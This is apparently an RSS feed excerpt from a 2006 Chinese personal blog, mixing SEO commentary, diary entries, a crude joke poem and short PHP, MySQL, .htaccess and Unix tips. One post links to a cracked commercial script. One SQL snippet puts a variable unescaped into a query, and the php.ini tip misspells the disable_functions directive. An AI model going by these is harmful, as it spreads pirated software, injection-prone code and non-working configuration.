当然，对于企业来说，收费排名是提升网站在搜索引擎中排名的最直接和最简单的办法。如今，如何提升网页在搜索引擎中的排序，已经形成了一门职业，叫SEO （Search Engine Optimization），即搜索引擎优化。SEO是针对搜索引擎排序的技术，通过修改网页（或者网站）结构和主动增加网站链接等方法来让搜索引擎认为这些网页是很重要的，从而提升网页在搜索引擎结果中的排序。 排序技术的发展趋势 各种搜索引擎的技术改进和优化，都直接反应到搜索结果的排序上。许多搜索引擎都在进一步研究新的排序方法，来提升客户的满意度。专业人士认为，目前的搜索引擎排序算法上还存在两大不足。 一、没有真正解决相关性。相关性是指搜索词和页面的相关程度。仅仅通过链接、字体、位置等表面特征，不能真正判断搜索词和文章的相关性，更何况许多时候这些特征不会都同时存在。这也是许多对搜索引擎做弊方法能有效的原因。另外，有些文章中没有出现搜索词，但说的就是和搜索词十分相关的内容，例如搜索“恐怖分子”，但有网页是介绍本拉登的一些破坏行动，文中没有出现“恐怖分子”的子眼，搜索引擎就无法搜索到该网页。表面特征只能治标，不能治本。治本的方法应该是增加语意理解，例如主题词和关键词的提取，从语意上分析，得出搜索词和网页的相关程度，分析的越准，效果就会越好。 中国站长资讯网,中国站长第一门户 二、搜索结果的单一化。在搜索引擎上，任何人搜索同一个词的结果都是一样。这样明显不能满足访问者。科学家搜索“星球”，可能是希望了解星球的知识，但普通人可能是想找“星球大战”电影，但搜索引擎所给的都是一样的结果。如何满足这些不同类型的访问者，需要对搜索结果的个性化。国外vivisimo公司（http://www.vivisimo.com）就是想解决这个问题，他们采用对搜索结果自动聚类的办法来满足不同类型客户的需要。搜索结果排序如果要实现从单一化到个性化，vivisimo已经迈出了一步，但最理想的结果应该是针对每个访问者，排序结果直接和他们的搜索习惯和意愿有关。搜索“体育”，对喜欢足球的人应该把足球的相关结果排在前面，对喜欢篮球的人应该把篮球的相关结果排在前面。 中国站长资讯网,中国站长第一门户 搜索引擎的排序技术应该也会朝着解决这两个不足的方向发展：语意相关性和排序个性化。前者需要完善的自然语言处理技术，后者需要记录庞大访问者信息和复杂的计算，要达到其中任何一个的要求均非易事，如何解决这些难题，任务落在了科学家和工程师们的肩上，哪个搜索引擎解决了这些问题，她可能会称为下一个搜索世界的霸主。</description>
    </item>
    
    <item>
      <title>刚刚在286看到的，好长时间没笑了呀</title>
      <link>http://example.org/2006/04/11/e5889ae5889ae59ca8286e79c8be588b0e79a84efbc8ce5a5bde995bfe697b6e997b4e6b2a1e7ac91e4ba86e59180/</link>
      <pubDate>Tue, 11 Apr 2006 11:28:08 +0000</pubDate>
      
      <guid>http://example.org/2006/04/11/e5889ae5889ae59ca8286e79c8be588b0e79a84efbc8ce5a5bde995bfe697b6e997b4e6b2a1e7ac91e4ba86e59180/</guid>
      <description>从前有位秀才，某天随太太回娘家，向岳父拜寿，
因一时高兴多喝了几杯，当场醉倒，被送回书房休息。
没多久，他的小姨子到书房拿东西，见姐夫睡的枕头掉地上，
便替他捡起来，顺手扶起他的脖子，想替他枕好，
没想到秀才人醉心不醉，一见机会难得，便拉着小姨子不放.
小姨子用力挣脱后，愤怒之余，就在墙上题诗以泄愤：
[好心来扶枕，为何拉我衣？若非姊姊面，一定是不依。该死！该死！
秀才等小姨子走后，下床一看，觉得很不好意思，便题诗辩白：
[贴心来扶枕，醉心拉你衣，只当是我妻，不知是小姨。失礼！失礼！ ]
秀才题完后再睡，其妻见墙上诗句，不禁醋火中烧，也题诗一首：
[有意来扶枕，有心拉她衣，墙上题诗句，都是骗人地。彼此！彼此！ ]
不久，小舅子也看到，不觉技痒，也提了一首：
[清心来扶枕，熏心拉她衣，姊妹虽一样，大的是你妻。清醒！清醒！ ]
后来被岳父发现，不禁大怒，也提一首诗，以作警告：
[不该来扶枕，不该拉她衣，两个都有错，下次不可以。切记！切记！ ]
岳母因心疼女婿，只得题诗一首诗，来打圆场：
[既已来扶枕，也已拉她衣，姐夫戏小姨，本来不稀奇。别提！别提！ ]
【原版】
续一：
小姨的未婚夫看到后，也气愤的题了一首：
可怜来扶枕，居然拉她衣，你敢戏小姨，我要戏你妻。公平！公平！
续二：
秀才自己的老爸看到后，也题了一首：
应该来扶枕，也可拉她衣，反正大已娶，多个更便宜！努力，努力！
续三：
秀才的老妈看到老头子题的后，觉得老头子的想法很好，也题了一首：
既然来扶枕，拼命拉她衣。一个好洗碗，一个去拖地！幸福，幸福！
续四：
路人甲：
既无人扶枕，如何来拉衣，偶想戏小姨，可惜还无妻。着急！着急！
续五：
路人乙：
无人来扶枕，何处拉她衣。小子本无妻，还想戏小姨！做梦，做梦！
续六：
路人丙：
小姨来扶枕，我就拉她衣。不只是小姨，还戏小小姨！加油，加油！
续七：
路人丁：
贤妻来扶枕，随便拉她衣。如果娶贤妻，何处戏小姨？郁闷！郁闷！
路人辛：
贤妻来扶枕，只有拉她衣。贤妻无姐妹，何处戏小姨？可惜！可惜！
路人戊：
秀才系人妖，木有小JJ，如若能接上，定能戏小姨。可悲，可悲！
路人己：
医学真神奇，秀才你莫急，接个狗东西，照样戏小姨。简单！简单！
谁人来扶枕，谁人拉她衣。既非亲眼见，和来戏小姨。谣言！谣言！
快去扶他枕，快来拉她衣。贤妻床边坐，观夫戏小姨。3P！3P！
来北京好长时间了
但不知道怎么回事没有几件高兴的事</description>
    </item>
    
    <item>
      <title>SQL语句时间查询</title>
      <link>http://example.org/2006/04/10/sqle8afade58fa5e697b6e997b4e69fa5e8afa2/</link>
      <pubDate>Mon, 10 Apr 2006 10:36:00 +0000</pubDate>
      
      <guid>http://example.org/2006/04/10/sqle8afade58fa5e697b6e997b4e69fa5e8afa2/</guid>
      <description>from_unixtime(date, &amp;lsquo;%Y%m%d&amp;rsquo;) = $date</description>
    </item>
    
    <item>
      <title>sql函数截取字符串！</title>
      <link>http://example.org/2006/04/10/sqle587bde695b0e688aae58f96e5ad97e7aca6e4b8b2efbc81/</link>
      <pubDate>Mon, 10 Apr 2006 08:06:22 +0000</pubDate>
      
      <guid>http://example.org/2006/04/10/sqle587bde695b0e688aae58f96e5ad97e7aca6e4b8b2efbc81/</guid>
      <description>Select Substring(xx,1,2) from TABLE
select left(xx,2) from TABLE</description>
    </item>
    
    <item>
      <title>MySQL实现表中取出随机数据</title>
      <link>http://example.org/2006/04/03/mysqle5ae9ee78eb0e8a1a8e4b8ade58f96e587bae99a8fe69cbae695b0e68dae/</link>
      <pubDate>Mon, 03 Apr 2006 11:58:38 +0000</pubDate>
      
      <guid>http://example.org/2006/04/03/mysqle5ae9ee78eb0e8a1a8e4b8ade58f96e587bae99a8fe69cbae695b0e68dae/</guid>
      <description>SELECT * FROM table_name ORDER BY rand() LIMIT 5;
rand在手册里是这么说的: RAND() RAND(N) 返回在范围0到1.0内的随机浮点值。如果一个整数参数N被指定，它被用作种子值。
mysql&amp;gt; select RAND(); -&amp;gt; 0.5925 mysql&amp;gt; select RAND(20); -&amp;gt; 0.1811 mysql&amp;gt; select RAND(20); -&amp;gt; 0.1811 mysql&amp;gt; select RAND(); -&amp;gt; 0.2079 mysql&amp;gt; select RAND(); -&amp;gt; 0.7888 你不能在一个ORDER BY子句用RAND()值使用列，因为ORDER BY将重复计算列多次。然而在MySQL3.23中，你可以做： SELECT * FROM table_name ORDER BY RAND()，这是有利于得到一个来自SELECT * FROM table1,table2 WHERE a=b AND cSELECT * FROM table_name AS r1 JOIN (SELECT ROUND(RAND() * (SELECT MAX(id) FROM table_name)) AS id) AS r2 WHERE r1.</description>
    </item>
    
    <item>
      <title>今天才知道INT的最大数是多少</title>
      <link>http://example.org/2006/03/28/e4bb8ae5a4a9e6898de79fa5e98193inte79a84e69c80e5a4a7e695b0e698afe5a49ae5b091/</link>
      <pubDate>Tue, 28 Mar 2006 12:31:37 +0000</pubDate>
      
      <guid>http://example.org/2006/03/28/e4bb8ae5a4a9e6898de79fa5e98193inte79a84e69c80e5a4a7e695b0e698afe5a49ae5b091/</guid>
      <description>是2147483647
唉，出了半天错才找到原因</description>
    </item>
    
    <item>
      <title>一个sql取出了很多数据，用了半天才解决</title>
      <link>http://example.org/2006/03/22/e4b880e4b8aasqle58f96e587bae4ba86e5be88e5a49ae695b0e68daeefbc8ce794a8e4ba86e58d8ae5a4a9e6898de8a7a3e586b3/</link>
      <pubDate>Wed, 22 Mar 2006 11:42:08 +0000</pubDate>
      
      <guid>http://example.org/2006/03/22/e4b880e4b8aasqle58f96e587bae4ba86e5be88e5a49ae695b0e68daeefbc8ce794a8e4ba86e58d8ae5a4a9e6898de8a7a3e586b3/</guid>
      <description>SELECT t1.*, t2.SortId FROM class_2 AS t1, class_3 AS t2 WHERE t2.SortId = t1.Typeid AND t1.SortId=&amp;rsquo;$id&#39;
t2.SortId 有多少条取出多少条用这句话终于解决了
SELECT DISTINCT t1.*, t2.SortId FROM class_2 AS t1, class_3 AS t2 WHERE t2.SortId = t1.Typeid AND t1.SortId=&amp;rsquo;$id&#39;</description>
    </item>
    
    <item>
      <title>wap网站</title>
      <link>http://example.org/2006/03/14/wape7bd91e7ab99/</link>
      <pubDate>Tue, 14 Mar 2006 14:17:27 +0000</pubDate>
      
      <guid>http://example.org/2006/03/14/wape7bd91e7ab99/</guid>
      <description>服务器到现在才明白是怎么回是
等有时间了做一个</description>
    </item>
    
    <item>
      <title>mysql索引</title>
      <link>http://example.org/2006/03/14/mysqle7b4a2e5bc95/</link>
      <pubDate>Tue, 14 Mar 2006 14:12:20 +0000</pubDate>
      
      <guid>http://example.org/2006/03/14/mysqle7b4a2e5bc95/</guid>
      <description>现在才知道它的重要性
但20多记录还是不够快,不知是不是机器的是</description>
    </item>
    
    <item>
      <title>上班好几天了，没时间写呀</title>
      <link>http://example.org/2006/03/10/e4b88ae78fade5a5bde587a0e5a4a9e4ba86efbc8ce6b2a1e697b6e997b4e58699e59180/</link>
      <pubDate>Fri, 10 Mar 2006 10:46:57 +0000</pubDate>
      
      <guid>http://example.org/2006/03/10/e4b88ae78fade5a5bde587a0e5a4a9e4ba86efbc8ce6b2a1e697b6e997b4e58699e59180/</guid>
      <description>上学的时侯想着工作，不过现在工作还是很开心的也许是因为做自己想做的事吧
不过不能上网倒是很郁闷，
唉有时间在写吧talo的钱也还了
昨天买了手机卡
有时间在写吧回去了!</description>
    </item>
    
    <item>
      <title>IndexU 5.0.1  国外商业搜索引擎汉化破解版</title>
      <link>http://example.org/2006/03/10/indexu-501-e59bbde5a496e59586e4b89ae6909ce7b4a2e5bc95e6938ee6b189e58c96e7a0b4e8a7a3e78988/</link>
      <pubDate>Fri, 10 Mar 2006 00:15:36 +0000</pubDate>
      
      <guid>http://example.org/2006/03/10/indexu-501-e59bbde5a496e59586e4b89ae6909ce7b4a2e5bc95e6938ee6b189e58c96e7a0b4e8a7a3e78988/</guid>
      <description>http://www.heibai.be 或 http://www.bdlive.cn</description>
    </item>
    
    <item>
      <title>PHP中的日期处理</title>
      <link>http://example.org/2006/03/01/phpe4b8ade79a84e697a5e69c9fe5a484e79086/</link>
      <pubDate>Wed, 01 Mar 2006 17:10:18 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/phpe4b8ade79a84e697a5e69c9fe5a484e79086/</guid>
      <description>我正打算用PHP编写一种帮助处理系统。我发现我必须知道处理完最后一位客户的问题后已经过去了多长时间？当我过去用ASP时解决这个问题相当简单，ASP有相应的函数DateDiff可以给出两个日期间间隔多少月、多少天和多少秒。当我搜寻完PHP手册后我发现PHP并没有类似的函数。
本文包含以下内容： 1、 得到目前的日期和时间－我们有多少种方式？ 2、 改变日期显示的方式－日期和时间的显示形式 3、 转换现在的日期为Unix的时间戳值 4、 改变日期 a. 增加时间 b. 减去时间 c. 找出两日期之间的间隔 5、 为PHP添加DateAdd函数 6、 为PHP添加DateDiff函数
**得到目前的日期和时间
在Unix中，时间的表示方式为计算从1970年1月1日零时起所过去的秒数，这称为UNIX 时间戳(Unix Epoch)。 如果我们有这样一段的代码： ? echo time(); ? 将返回值958905820 而此时的时间为2000年5月21日12时43分。 你也许会说这相当不错。当这对我毫无帮助，或者只有一点帮助。在PHP中，对日期处理的函数都必须用到由time()返回的时间戳值。同时，由于PHP在Unix和Windows系统中均使用同样的时间戳值，这就允许你不需要修改代码即可在不同的系统间移植。另外的一个好处是time()函数返回的是一个整数，你可以将其作为整数字段或文本字段存入数据库，而不必使用特别的日期/时间字段。 你已经基本了解了Unix的时间戳值，现在让我们来展示它的实际用途。
改变日期显示的方式－日期和时间的显示形式
PHP提供两个办法来将Unix的时间戳值转换成为有用的数据。第一个是date()函数。这个函数有两个参数－第一个字符串用于设定你所希望返回的格式，第二个为Unix的时间戳值。 格式化字符串通过一些简单的特殊格式化字符来显示你所希望看到的格式的日期和时间。假设你希望日期以这样的格式显示“18h01 Sunday 21 May”。 我们需要对字符串中的每一部分使用一个特殊格式化字符，你可以从PHP手册中日期和时间函数库中找到。这样的特殊格式化字符数量不少，他们所表示的类似于星期几、月的英文名、用2位或4位数表示的年份，是否是上午（AM）或下午（PM）以及其他。对于这个例子我们需要的特殊字符为： ‘H’ －24 小时制的小时 ‘i’－ 分钟 ‘l’－ 星期几的英文全名 ‘d’－ 本月的第几日 ‘F’－ 月份的英文全名 因此我们的格式化字符串为”Hhi l d F”， PHP代码为： ? echo date (&amp;ldquo;Hhi l d F&amp;rdquo; ,time()); ? 当我们执行这段代码，我们发现我们所得到的结果为： 180609 Sunday 21 May 这样的结果看起来有些奇怪。让我们再查一下PHP手册，原来’h’所代表的是12 小时制的小时数。这再次证明了一句真理：“计算机只做你所告诉它该做的，而不是你想要它做的”。我们有两个选择。第一个是在h前使用转义字符“”： echo date (&amp;ldquo;Hhi l d F&amp;rdquo;, time()); 我们得到这样的结果： 18h12 Sunday 21 May 这正是我们所要的。但如果我们在一个十分复杂的句子中需要包含日期和时间，我们是否需要对每个字符使用转义字符？ 答案当然是不。我们使用另一个函数strftime()。 strftime()有两个好处。第一个好处我们并不在本文讨论范围内－如果你使用setlocale()函数，你可以通过strftime得到相应语言的月份的名称。另外的一个好处是你可以将特别的日期和时间的格式化字符包含在你的字符串中。这同时也意味着无论你是否要学习date()函数的所有特殊格式化字符，你都必须学习一整套完全不同的格式化字符。 strftime()工作的方式和date()没有什么不同，除了特殊格式化字符的前面必须添加一个百分号%。如果用strftime()函数，前面例子的代码如下： ?</description>
    </item>
    
    <item>
      <title>怎么样可以把 phpinfo()屏蔽掉?</title>
      <link>http://example.org/2006/03/01/e6808ee4b988e6a0b7e58fafe4bba5e68a8a-phpinfoe5b18fe894bde68e89/</link>
      <pubDate>Wed, 01 Mar 2006 17:07:17 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/e6808ee4b988e6a0b7e58fafe4bba5e68a8a-phpinfoe5b18fe894bde68e89/</guid>
      <description>Q:怎么样可以把 phpinfo()屏蔽掉?
A:路径：C:winntphp.ini（NT和2000）C:windows(95,98） 在 php.ini 配置文件里面有这个选项 disable_functions = ; This directive allows you to disable certain ; functions for security reasons. It receives ; a comma separated list of function names. ; This directive is NOT affected by whether ; Safe Mode is turned on or off. 改成 disble_functions = phpinfo</description>
    </item>
    
    <item>
      <title>php中rename()函数的妙用</title>
      <link>http://example.org/2006/03/01/phpe4b8adrenamee587bde695b0e79a84e5a699e794a8/</link>
      <pubDate>Wed, 01 Mar 2006 17:06:18 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/phpe4b8adrenamee587bde695b0e79a84e5a699e794a8/</guid>
      <description>大家都知道，rename()函数可以对文件或目录进行重命名的操作。其实它还可以做很多事情。
熟悉unix的朋友应该知道shell命令mv，它相当与win32的移动，而且移动的同时可进行重命名。我发现，php的rename()函数就相当于mv，它不仅仅只有简单的重命名的功能，同样可以改变文件甚至整个目录的路径。 例如：
$oldpath &amp;mdash;-文件或目录原来路径
$newpath &amp;mdash;-新定义路径
那么 rename($oldpath,$newpath)就可以完成文件/目录移动的操作
经过我的测试，win32和unix的php4版本都支持这个功能。
另外，好象php4的win32版取消了unlink()函数。那么还可以巧用rename()函数来完成删除的操作，例如：
$path &amp;mdash;- 文件或目录路径
$tmp &amp;mdash;- tmp目录（/tmp)
用rename($path,$tmp) 将文件移动到tmp目录.</description>
    </item>
    
    <item>
      <title>PHP中如何使用header发送头部信息</title>
      <link>http://example.org/2006/03/01/phpe4b8ade5a682e4bd95e4bdbfe794a8headere58f91e98081e5a4b4e983a8e4bfa1e681af/</link>
      <pubDate>Wed, 01 Mar 2006 17:05:02 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/phpe4b8ade5a682e4bd95e4bdbfe794a8headere58f91e98081e5a4b4e983a8e4bfa1e681af/</guid>
      <description>在照彭武兴先生的《PHP BIBLE》中所述，header可以送出Status标头，如
就可以让用户浏览器出现文件找不到的404错误，但是我试了这样是不行的。
后来我到w3.org上查了http的相关资料，终于试出来了如何Header出状态代码(Status)，与大家分享。
其实应该是这样的:
Header(&amp;ldquo;http/1.1 403 Forbidden&amp;rdquo;);
?&amp;gt;
第一部分为HTTP协议的版本(HTTP-Version)
第二部分为状态代码(Status)
第三部分为原因短语(Reason-Phrase)
三部分中间用一个空格分开，且中间不能有回车,第一部分和第二部分是必需的，第三部分则是给人看的，可写可不写甚至乱写。
还有，这一句的输出必须在Html文件的第一行。
下面我给出各代码所代表的意思(是从w3.org上查到的,够权威了):
* 1xx: Informational - Request received, continuing process
* 2xx: Success - The action was successfully received, understood,
and accepted
* 3xx: Redirection - Further action must be taken in order to
complete the request
* 4xx: Client Error - The request contains bad syntax or cannot be
fulfilled
* 5xx: Server Error - The server failed to fulfill an apparently</description>
    </item>
    
    <item>
      <title>一个全面获取图象信息的函数getImageInfo()</title>
      <link>http://example.org/2006/03/01/e4b880e4b8aae585a8e99da2e88eb7e58f96e59bbee8b1a1e4bfa1e681afe79a84e587bde695b0getimageinfo/</link>
      <pubDate>Wed, 01 Mar 2006 17:02:57 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/e4b880e4b8aae585a8e99da2e88eb7e58f96e59bbee8b1a1e4bfa1e681afe79a84e587bde695b0getimageinfo/</guid>
      <description>$img_info[0], &amp;ldquo;height&amp;rdquo;=&amp;gt;$img_info[1], &amp;ldquo;type&amp;rdquo;=&amp;gt;$img_type &amp;ldquo;size&amp;rdquo;=&amp;gt;$img_size } return $new_img_info; } ?&amp;gt;</description>
    </item>
    
    <item>
      <title>何使用PHP中的字符串函数</title>
      <link>http://example.org/2006/03/01/e4bd95e4bdbfe794a8phpe4b8ade79a84e5ad97e7aca6e4b8b2e587bde695b0/</link>
      <pubDate>Wed, 01 Mar 2006 17:01:06 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/e4bd95e4bdbfe794a8phpe4b8ade79a84e5ad97e7aca6e4b8b2e587bde695b0/</guid>
      <description>**7)nl2br **在字符串中的每一个回车前面加上&amp;quot; &amp;ldquo;.
**(8)AddSlashes,StripSlashes **分别给字符串中需要加上&amp;quot;&amp;ldquo;才能用于数据库查询的字符加上和去掉&amp;rdquo;&amp;rdquo;.
**(9)parse_str **将&amp;quot;name1=value1&amp;amp;name2;=value2&amp;amp;&amp;hellip;&amp;ldquo;类型的字符串分析成一些变量.
例如: parse_str(&amp;ldquo;a=1&amp;amp;b;=2&amp;rdquo;); 生成$a与$b两个变量,值分别为1,2. 如果有两对名字/值的名字部分相同,则后一个的值覆盖前一个的.
如果这两对的名字尾部都有&amp;rdquo;[]&amp;quot;,例如&amp;quot;a[]=1&amp;amp;a;[]=2&amp;quot;,则生成数组$a,两个元素分别为1,2</description>
    </item>
    
    <item>
      <title>在北京的感觉</title>
      <link>http://example.org/2006/03/01/e59ca8e58c97e4baace79a84e6849fe8a789/</link>
      <pubDate>Wed, 01 Mar 2006 10:13:26 +0000</pubDate>
      
      <guid>http://example.org/2006/03/01/e59ca8e58c97e4baace79a84e6849fe8a789/</guid>
      <description>今天是来到北京的第二天了
本想支亿中邮去看看可是没找到地址，真是郁闷，去了王俯井也没找到
今天很累，坐了一天车，不过在北京的感觉确实不错
就是吃饭贵了点一碗抄饼用了5元还没吃饱
现在来上网了从现在到明天早上25唉
在看看工作的事吧
如果可能的话真想留在这里
希望。。。。。。</description>
    </item>
    
    <item>
      <title>今天到北京了</title>
      <link>http://example.org/2006/02/28/e4bb8ae5a4a9e588b0e58c97e4baace4ba86/</link>
      <pubDate>Tue, 28 Feb 2006 13:58:35 +0000</pubDate>
      
      <guid>http://example.org/2006/02/28/e4bb8ae5a4a9e588b0e58c97e4baace4ba86/</guid>
      <description>总算来到北京了，真不知道能不能在这里呆下去
这里确实很好，希望能在这里找到一份好工作</description>
    </item>
    
    <item>
      <title>apache中.htaccess文件的功能写法</title>
      <link>http://example.org/2006/02/26/apachee4b8adhtaccesse69687e4bbb6e79a84e58a9fe883bde58699e6b395/</link>
      <pubDate>Sun, 26 Feb 2006 10:32:08 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/apachee4b8adhtaccesse69687e4bbb6e79a84e58a9fe883bde58699e6b395/</guid>
      <description>.htaccess 文件(或者”分布式配置文件”提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。
.htaccess必须以ASCII模式上传，最好将其权限设置为644。
错误文档的定位
常用的客户端请求错误返回代码： 401 Authorization Required 403 Forbidden 404 Not Found 405 Method Not Allowed 408 Request Timed Out 411 Content Length Required 412 Precondition Failed 413 Request Entity Too Long 414 Request URI Too Long 415 Unsupported Media Type 常见的服务器错误返回代码： 500 Internal Server Error
用户可以利用.htaccess指定自己事先制作好的错误提醒页面。一般情况下，人们可以专门设立一个目录，例如errors放置这些页面。然后再.htaccess中，加入如下的指令：
ErrorDocument 404 /errors/notfound.html ErrorDocument 500 /errors/internalerror.html 一条指令一行。上述第一条指令的意思是对于404，也就是没有找到所需要的文档的时候得显示页面为/errors目录下的notfound.html页面。不难看出语法格式为：
ErrorDocument 错误代码 /目录名/文件名.扩展名 如果所需要提示的信息很少的话，不必专门制作页面，直接在指令中使用HTML号了，例如下面这个例子：
ErrorDocument 401 &amp;quot; 你没有权限访问该页面，请放弃！
&amp;quot; 文档访问的密码保护
要利用.htaccess对某个目录下的文档设定访问用户和对应的密码，首先要做的是生成一个.htpasswd的文本文档，例如：</description>
    </item>
    
    <item>
      <title>今天研究WordPress的总结</title>
      <link>http://example.org/2006/02/26/e4bb8ae5a4a9e7a094e7a9b6wordpresse79a84e680bbe7bb93/</link>
      <pubDate>Sun, 26 Feb 2006 10:23:28 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/e4bb8ae5a4a9e7a094e7a9b6wordpresse79a84e680bbe7bb93/</guid>
      <description>几个今天发现的plugin
WordPress Plugin: Recent Updates 最近更新plugin 有些选项可在后台设置,是至今找到比较完美的,应该适用于2.0 http://www.semiologic.com/software/recent-updates/
WordPress Plugin: Recent Posts 最近发表plugin 有些选项可在后台设置,是至今找到比较完美的,应该适用于2.0 http://www.semiologic.com/software/recent-posts/
以下是2个关于Tags的plugin,Blogging Pro上还有好多关于Tags的plugin,过后得研究下 WordPress Plugin: Simple Tags 2.0 http://www.broobles.com/scripts/simpletags/ WordPress Plugin: Technorati Tagging of Posts http://www.bloggingpro.com/archives/2006/01/13/technorati-tagging-of-posts/
WordPress Plugin: Google Analytics Plugin 加入Google Analytics 统计代码这下不必自己修改WordPress程序了 http://www.semiologic.com/software/google-analytics/ WordPress Plugin: Google Analyticator 这个也是关于Google Analytics 统计的 http://cavemonkey50.com/code/google-analyticator/
WordPress Plugin: Google Adsene Maintenance 似乎是定时关闭Google Adsene的 http://www.jensense.com/archives/2005/12/adsense_will_be.html
Wordpress 风格 A New Spring 这个风格挺清爽,做得不错,可以二度加工下 http://www.codebymatt.com/blog/?p=21
再次注明一下这几个WordPress plugin站点
http://wp-plugins.net/ http://www.bloggingpro.com/archives/category/wordpress-plugins/ 另外发现http://www.semiologic.com网站上的语言栏,哇靠,多语言全自动全文翻译,真COOL,比GOOGLE的翻译还COOL,不知道用的什么翻译引擎,一会再看看.
在DreamHost上一键装了WordPress2.0,发现自己实在懒得要命,连上传WordPress2.0都懒了:( 试用了下下,感觉比1.5强很多,应该说规范很多,许多细节和功能的变化还是很舒心的,加入了期待已久的TinyMCE,上传部份也整合到了发表页面,等等 这下升级1.5.2到2.0又得花些时间了,最怕这样升级</description>
    </item>
    
    <item>
      <title>Unix命令大全</title>
      <link>http://example.org/2006/02/26/unixe591bde4bba4e5a4a7e585a8/</link>
      <pubDate>Sun, 26 Feb 2006 10:20:05 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/unixe591bde4bba4e5a4a7e585a8/</guid>
      <description>1.登录工作站 1.1 透过 PC 登录工作站 执行格式：telnet hostname (在 dos 下执行) telnet ip-address Example:
telnet doc telnet 140.122.77.120 注: 可利用指令 arp hostname 或 arp domain_name 查询 ip_address
1.2 登录步骤 login : _______ &amp;gt; 输入 username
password : _______ &amp;gt; 输入密码
1.3 登出步骤
% logout 或 % exit 或 % 1.4 更改帐号密码
% yppasswd &amp;gt; 执行后将会出现下列信息 Changing NIS password for user on ice. Old password: ______ &amp;gt; 输入旧密码 New password: ______ &amp;gt; 输入新密码(最好6-8字，英文字母与数字混合) Retype new password: ______ &amp;gt; 再输入一次密码 1.</description>
    </item>
    
    <item>
      <title>只需两个参数：最傻瓜的一个通用分页类</title>
      <link>http://example.org/2006/02/26/e58faae99c80e4b8a4e4b8aae58f82e695b0efbc9ae69c80e582bbe7939ce79a84e4b880e4b8aae9809ae794a8e58886e9a1b5e7b1bb/</link>
      <pubDate>Sun, 26 Feb 2006 09:47:47 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/e58faae99c80e4b8a4e4b8aae58f82e695b0efbc9ae69c80e582bbe7939ce79a84e4b880e4b8aae9809ae794a8e58886e9a1b5e7b1bb/</guid>
      <description>/** ** 通用分页类。只需提供数据总数与每页显示数。 ** 无需指定URL，链接由程序生成。方便用于检索结果分页。 ** @author : lino(luckfeng@gmail.com) ** @site : http://www.ypren.com ** @version : 0.3 ** @date : 2006/2/24 **/ class Pager{ var $url; var $countall; var $page; var $thestr; var $backstr; var $nextstr; var $pg; //构造函数，实例化该类的时候自动执行该函数 function Pager($countall,$countlist){ @$this-&amp;gt;pg=sprintf(&amp;quot;%d&amp;quot;,$_GET[&amp;quot;pg&amp;quot;]); //保证pg在未指定的情况下为从第1页开始 if ($this-&amp;gt;pg==0){ $this-&amp;gt;pg=1; } if (!isset($this-&amp;gt;pg)){ $this-&amp;gt;pg=1; } //记录数与每页显示数不能整队时，页数取余后加1 $this-&amp;gt;countall = $countall; if ($this-&amp;gt;countall%$countlist!=0){ $this-&amp;gt;page=sprintf(&amp;quot;%d&amp;quot;,$this-&amp;gt;countall/$countlist)+1; } else{ $this-&amp;gt;page=$this-&amp;gt;countall/$countlist; } //得到当前的URL。具体实现请看最底部的函数实体 $this-&amp;gt;url = Pager::getUrl(); //生成12345等数字形式的分页。 if ($this-&amp;gt;page&amp;lt;=10){ for ($i=1;$i&amp;lt;$this-&amp;gt;page+1;$i++){ $this-&amp;gt;thestr=$this-&amp;gt;thestr.</description>
    </item>
    
    <item>
      <title>在php中怎么判断一个变量是不是数字？</title>
      <link>http://example.org/2006/02/26/e59ca8phpe4b8ade6808ee4b988e588a4e696ade4b880e4b8aae58f98e9878fe698afe4b88de698afe695b0e5ad97efbc9f/</link>
      <pubDate>Sun, 26 Feb 2006 09:41:47 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/e59ca8phpe4b8ade6808ee4b988e588a4e696ade4b880e4b8aae58f98e9878fe698afe4b88de698afe695b0e5ad97efbc9f/</guid>
      <description>is_numeric($xxx)；</description>
    </item>
    
    <item>
      <title>刚才在村子里看到的很有意思</title>
      <link>http://example.org/2006/02/26/e5889ae6898de59ca8e69d91e5ad90e9878ce79c8be588b0e79a84e5be88e69c89e6848fe6809d/</link>
      <pubDate>Sun, 26 Feb 2006 09:35:11 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/e5889ae6898de59ca8e69d91e5ad90e9878ce79c8be588b0e79a84e5be88e69c89e6848fe6809d/</guid>
      <description>原来三元运算可以这样写
&amp;lt;code&amp;gt;&amp;lt;font color=&amp;quot;#000000&amp;quot;&amp;gt; &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;&amp;lt; ?php $test&amp;lt;/font&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;= &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;59&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;; &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#ff8000&amp;quot;&amp;gt;//学生分数 &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$res &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;= ((&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$temp_res &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;= &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$test &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;- &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;60&amp;lt;/font&amp;gt;&amp;lt;font 